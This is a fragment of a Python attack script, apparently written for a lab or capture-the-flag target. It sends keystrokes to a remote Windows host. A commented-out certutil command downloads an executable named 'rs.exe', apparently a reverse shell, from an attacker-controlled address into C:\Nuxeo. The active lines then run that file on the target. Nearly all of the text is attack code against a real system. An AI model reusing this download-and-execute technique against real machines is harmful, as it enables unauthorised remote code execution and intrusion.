...
try:
	...
	lhost = '10.10.16.48:8000' # sys.argv[2]
	payload = 'rs.exe' # sys.argv[3]
except:
...
def main():
	...
	# SendString("certutil.exe -f -urlcache http://" + lhost + "/" + payload + " C:\\Nuxeo\\" + payload, rhost) # Retrieve HTTP hosted payload
	# sleep(0.3)
	# print("[+] Downloading Payload")
	# SendReturn()
	sleep(3)
	SendString("C:\\Nuxeo\\" + payload, rhost) # Execute Payload
	sleep(0.3)
	SendReturn()
